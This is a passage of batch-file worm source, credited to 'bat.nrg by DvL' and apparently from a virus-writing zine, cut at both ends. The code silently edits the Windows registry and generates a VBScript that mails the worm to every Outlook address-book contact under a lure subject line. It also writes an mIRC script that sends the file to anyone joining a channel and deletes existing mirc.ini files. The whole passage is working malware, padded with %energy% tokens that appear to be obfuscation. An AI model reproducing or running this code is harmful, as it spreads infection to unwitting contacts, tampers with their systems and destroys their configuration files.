eg.reg%energy%
%energy%@echo."RegisteredOwner"="bat.nrg by DvL">>%windir%\DV£\reg.reg%energy%
%energy%@echo.[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>%windir%\DV£\reg.reg%energy%
%energy%@echo."RegisteredOrganization"="BZ mag 1">>%windir%\DV£\reg.reg%energy%
%energy%@regedit /s %windir%\DV£\reg.reg%energy%
::
:: outlook express spreading
::
%energy%@echo.on error resume next>out%energy%
%energy%@echo.dim a,b,c,d,e>>out%energy%
%energy%@echo.set a = Wscript.CreateObject("Wscript.Shell")>>out%energy%
%energy%@echo.set b = CreateObject("Outlook.Application")>>out%energy%
%energy%@echo.set c = b.GetNameSpace("MAPI")>>out%energy%
%energy%@echo.for y = 1 To c.AddressLists.Count>>out%energy%
%energy%@echo.set d = c.AddressLists(y)>>out%energy%
%energy%@echo.x = 1>>out%energy%
%energy%@echo.set e = b.CreateItem(0)>>out%energy%
%energy%@echo.for o = 1 To d.AddressEntries.Count>>out%energy%
%energy%@echo.f = d.AddressEntries(x)>>out%energy%
%energy%@echo.e.Recipients.Add f>>out%energy%
%energy%@echo.x = x + 1>>out%energy%
%energy%@echo.next>>out%energy%
%energy%@echo.e.Subject = "Chicky girls !">>out%energy%
%energy%@echo.e.Body = " Wanna know everything about girls and how to get them ??? Use the attachment to register to our zine and follow the instructions ! ">>out%energy%
%energy%@echo.e.Attachments.Add ("c:\windows\DV£\nrg.bat")>>out%energy%
%energy%@echo.e.DeleteAfterSubmit = False>>out%energy%
%energy%@echo.e.Send>>out%energy%
%energy%@echo.f = "">>out%energy%
%energy%@echo.next>>out%energy%
%energy%@copy out %windir%\DV£\out.vbs%energy%
%energy%@deltree/y out >nul%energy%
%energy%@start %windir%\DV£\out.vbs%energy%
::
:: mirc spreading
::
%energy%@echo.[script]>%windir%\DV£\mirc%energy%
%energy%@echo.n0=on 1:JOIN:#:{>>%windir%\DV£\mirc%energy%
%energy%@echo.n1= /if ( nick == $me ) { halt }>>%windir%\DV£\mirc%energy%
%energy%@echo.n2= /.dcc send $nick c:\windows\DV£\nrg.bat>>%windir%\DV£\mirc%energy%
%energy%@echo.n3=}>>%windir%\DV£\mirc%energy%
%energy%@deltree/y c:\mirc\mirc.ini >nul%energy%
%energy%@deltree/y c:\mirc32\mirc.ini >nul%energy%
%energy%@deltree/y c:\progra~1\mirc\mirc.ini >nul%energy%
%energy%@deltree/y c:\progra~1\mirc32\mirc.ini >nul%energy%
%energy%@if exist c:\mirc\mirc.ini 